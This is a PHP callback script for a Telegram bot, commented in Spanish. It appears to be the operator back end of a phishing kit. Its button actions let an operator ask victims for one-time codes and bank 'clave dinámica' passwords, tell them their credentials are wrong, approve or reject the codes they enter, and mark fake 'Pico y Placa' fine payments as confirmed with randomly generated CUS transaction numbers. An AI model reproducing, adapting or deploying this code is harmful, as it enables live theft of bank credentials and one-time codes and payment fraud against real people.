<?php
// ═══════════════════════════════════════════
//  CALLBACK UNIVERSAL (CORREGIDO)
//  Maneja botones de Telegram y pagos
// ═══════════════════════════════════════════
require_once __DIR__ . '/config.php';

header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: GET, POST, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type");
header("Content-Type: application/json; charset=UTF-8");

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') { http_response_code(200); exit(); }

// ═══════════════════════════════════════════
//  Helpers
// ═══════════════════════════════════════════
function tgRequest($method, $data) {
    $ch = curl_init("https://api.telegram.org/bot" . TG_BOT_TOKEN . "/" . $method);
    curl_setopt_array($ch, [
        CURLOPT_POST           => true,
        CURLOPT_POSTFIELDS     => json_encode($data),
        CURLOPT_HTTPHEADER     => ['Content-Type: application/json'],
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT        => 10,
    ]);
    $resp = curl_exec($ch);
    curl_close($ch);
    return json_decode($resp, true);
}

function answerCallback($callbackId, $text) {
    tgRequest('answerCallbackQuery', ['callback_query_id' => $callbackId, 'text' => $text]);
}

function editMessage($chatId, $msgId, $newText) {
    tgRequest('editMessageText', [
        'chat_id'    => $chatId,
        'message_id' => $msgId,
        'text'       => $newText,
        'parse_mode' => 'MarkdownV2',
    ]);
}

function getSolicitud($id) {
    $file = DATA_DIR . '/solicitudes/' . $id . '.json';
    if (!file_exists($file)) return null;
    return json_decode(file_get_contents($file), true);
}

function updateSolicitud($id, $updates) {
    $file = DATA_DIR . '/solicitudes/' . $id . '.json';
    if (!file_exists($file)) return false;
    $data = json_decode(file_get_contents($file), true);
    $data = array_merge($data, $updates);
    file_put_contents($file, json_encode($data, JSON_UNESCAPED_UNICODE), LOCK_EX);
    return true;
}

function getPayment($id) {
    $file = DATA_DIR . '/payments/' . $id . '.json';
    if (!file_exists($file)) return null;
    return json_decode(file_get_contents($file), true);
}

function updatePayment($id, $updates) {
    $file = DATA_DIR . '/payments/' . $id . '.json';
    if (!file_exists($file)) return false;
    $data = json_decode(file_get_contents($file), true);
    $data = array_merge($data, $updates);
    file_put_contents($file, json_encode($data, JSON_UNESCAPED_UNICODE), LOCK_EX);
    return true;
}

// ═══════════════════════════════════════════
//  GET: Configurar Webhook o Consultar Estado
// ═══════════════════════════════════════════
if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    $setupWebhook = $_GET['setup_webhook'] ?? '';
    $paymentId = trim($_GET['payment_id'] ?? '');
    $solicitudId = trim($_GET['solicitud_id'] ?? '');

    // 1. CONFIGURAR WEBHOOK (Paso obligatorio)
    if ($setupWebhook === 'true') {
        $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
        $host = $_SERVER['HTTP_HOST'];
        $path = $_SERVER['PHP_SELF'];
        $webhookUrl = $protocol . '://' . $host . $path;

        $result = tgRequest('setWebhook', [
            'url'             => $webhookUrl,
            'allowed_updates' => ['callback_query', 'message'],
        ]);

        if ($result && $result['ok']) {
            echo json_encode(['ok' => true, 'webhook' => $webhookUrl, 'message' => 'Webhook configurado']);
        } else {
            echo json_encode(['ok' => false, 'error' => 'Error configurando webhook', 'details' => $result]);
        }
        exit();
    }

    // 2. CONSULTAR SOLICITUD DE AUTH
    if ($solicitudId) {
        $solicitud = getSolicitud($solicitudId);
        if ($solicitud) {
            echo json_encode(['status' => $solicitud['status'] ?? 'pending', 'type' => $solicitud['type'] ?? 'unknown']);
        } else {
            echo json_encode(['status' => 'not_found']);
        }
        exit();
    }

    // 3. CONSULTAR PAGO (Pico y Placa)
    if ($paymentId) {
        $payData = getPayment($paymentId);
        if ($payData) {
            if ($payData['status'] !== 'pending') {
                echo json_encode(['status' => $payData['status'], 'cus' => $payData['cus'] ?? null]);
            } else {
                // Fallback: buscar click en updates (solo si webhook falla)
                $offsetFile = DATA_DIR . '/offset.txt';
                $offset = file_exists($offsetFile) ? (int)file_get_contents($offsetFile) : 0;
                $ch = curl_init("https://api.telegram.org/bot" . TG_BOT_TOKEN . "/getUpdates?offset={$offset}&timeout=0&allowed_updates=callback_query");
                curl_setopt_array($ch, [CURLOPT_HTTPGET => true, CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 5]);
                $resp = curl_exec($ch);
                curl_close($ch);

                if ($resp) {
                    $updates = json_decode($resp, true);
                    if ($updates['ok'] && !empty($updates['result'])) {
                        $maxOffset = $offset;
                        foreach ($updates['result'] as $update) {
                            $updateId = $update['update_id'];
                            if ($updateId >= $maxOffset) $maxOffset = $updateId + 1;
                            if (!isset($update['callback_query'])) continue;

                            $cq = $update['callback_query'];
                            $cbData = $cq['data'] ?? '';

                            if ($cbData === 'confirm_' . $paymentId) {
                                $cus = rand(100000000, 999999999);
                                updatePayment($paymentId, ['status' => 'confirmed', 'cus' => (string)$cus]);
                                file_put_contents($offsetFile, $maxOffset);
                                answerCallback($cq['id'], '✅ Pago confirmado');
                                editMessage($cq['message']['chat']['id'], $cq['message']['message_id'], "✅ *Pago confirmado*\n🚘 Placa: `{$payData['placa']}`\n💰 Monto: \${$payData['monto']}\nCUS: `{$cus}`");
                                echo json_encode(['status' => 'confirmed', 'cus' => (string)$cus]);
                                exit();
                            }
                            if ($cbData === 'reject_' . $paymentId) {
                                updatePayment($paymentId, ['status' => 'rejected']);
                                file_put_contents($offsetFile, $maxOffset);
                                answerCallback($cq['id'], '❌ Pago rechazado');
                                editMessage($cq['message']['chat']['id'], $cq['message']['message_id'], "❌ *Pago rechazado*\n🚘 Placa: `{$payData['placa']}`");
                                echo json_encode(['status' => 'rejected']);
                                exit();
                            }
                        }
                        file_put_contents($offsetFile, $maxOffset);
                    }
                }
                echo json_encode(['status' => 'pending']);
            }
        } else {
            http_response_code(404);
            echo json_encode(['status' => 'error', 'message' => 'Pago no encontrado']);
        }
        exit();
    }

    http_response_code(400);
    echo json_encode(['status' => 'error', 'message' => 'Falta ID']);
    exit();
}

// ═══════════════════════════════════════════
//  POST: Webhook de Telegram (Botones)
// ═══════════════════════════════════════════
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $input = json_decode(file_get_contents("php://input"), true);
    if (!$input || !isset($input['callback_query'])) {
        echo json_encode(['ok' => true, 'message' => 'Update recibido']);
        exit();
    }

    $cq = $input['callback_query'];
    $cbData = $cq['data'] ?? '';
    $cbQueryId = $cq['id'];
    $message = $cq['message'] ?? [];
    $chatId = $message['chat']['id'] ?? 0;
    $msgId = $message['message_id'] ?? 0;
    $originalText = $message['text'] ?? '';

    // Parsear acción e ID correctamente
    $knownActions = [
        'pedir_otp', 'pedir_clave_din', 'error_credenciales',
        'aprobar_otp', 'rechazar_otp', 'aprobar_clave_din', 'rechazar_clave_din',
        'continue', 'confirm', 'reject'
    ];

    $action = 'unknown';
    $entityId = ''; // Puede ser solicitudId o paymentId

    foreach ($knownActions as $act) {
        if (strpos($cbData, $act . '_') === 0) {
            $action = $act;
            $entityId = substr($cbData, strlen($act) + 1);
            break;
        }
    }

    $responseText = '';
    $estadoTexto = '';
    $newStatus = '';

    $actionMap = [
        'pedir_otp'           => ['📱 Código OTP solicitado',       '📱 *OTP SOLICITADO* \- Ingrese el código de verificación',        'pedir_otp'],
        'pedir_clave_din'     => ['🔑 Clave Dinámica solicitada',   '🔑 *CLAVE DINÁMICA SOLICITADA* \- Ingrese su clave dinámica',     'pedir_clave_din'],
        'error_credenciales'  => ['❌ Credenciales incorrectas',    '❌ *ERROR CREDENCIALES* \- Los datos ingresados no coinciden',    'error_credenciales'],
        'aprobar_otp'         => ['✅ OTP aprobado',                '✅ *OTP APROBADO* \- Redirigiendo al cliente',                    'aprobar_otp'],
        'rechazar_otp'        => ['❌ OTP rechazado',               '❌ *OTP RECHAZADO* \- El código es incorrecto',                   'rechazar_otp'],
        'aprobar_clave_din'   => ['✅ Clave Dinámica aprobada',     '✅ *CLAVE DINÁMICA APROBADA* \- Redirigiendo al cliente',         'aprobar_clave_din'],
        'rechazar_clave_din'  => ['❌ Clave Dinámica rechazada',    '❌ *CLAVE DINÁMICA RECHAZADA* \- La clave es incorrecta',         'rechazar_clave_din'],
        'continue'            => ['✅ Continuar',                   '✅ *CONTINUAR* \- Cliente procediendo',                           'continue'],
        'confirm'             => ['✅ Pago confirmado',             '✅ *PAGO CONFIRMADO*',                                            'confirmed'],
        'reject'              => ['❌ Pago rechazado',              '❌ *PAGO RECHAZADO*',                                             'rejected'],
    ];

    if (isset($actionMap[$action])) {
        $responseText = $actionMap[$action][0];
        $estadoTexto  = $actionMap[$action][1];
        $newStatus    = $actionMap[$action][2];
    } else {
        $responseText = '⚠️ Acción procesada';
        $estadoTexto  = '⚠️ *Acción procesada*';
        $newStatus    = $action;
    }

    // Actualizar estado (distingue entre Pagos y Solicitudes)
    if ($entityId) {
        if (strpos($entityId, 'pyp_') === 0) {
            // Es un pago
            if ($newStatus === 'confirmed') {
                $cus = rand(100000000, 999999999);
                updatePayment($entityId, ['status' => 'confirmed', 'cus' => (string)$cus]);
            } else if ($newStatus === 'rejected') {
                updatePayment($entityId, ['status' => 'rejected']);
            }
        } else {
            // Es una solicitud de auth
            updateSolicitud($entityId, ['status' => $newStatus, 'updated_at' => date('c')]);
        }
    }

    answerCallback($cbQueryId, $responseText);

    if ($chatId && $msgId) {
        if ($originalText) {
            $estadoRegex = '/⏳ \*Estado:\* .+/s';
            if (preg_match($estadoRegex, $originalText)) {
                $newText = preg_replace($estadoRegex, "⏳ *Estado:* $estadoTexto", $originalText);
            } else {
                $newText = $originalText . "\n\n⏳ *Estado:* $estadoTexto";
            }
        } else {
            $newText = "⏳ *Estado:* $estadoTexto";
        }
        editMessage($chatId, $msgId, $newText);
    }

    echo json_encode(['ok' => true, 'action' => $action, 'id' => $entityId]);
    exit();
}

http_response_code(405);
echo json_encode(['error' => 'Método no permitido']);
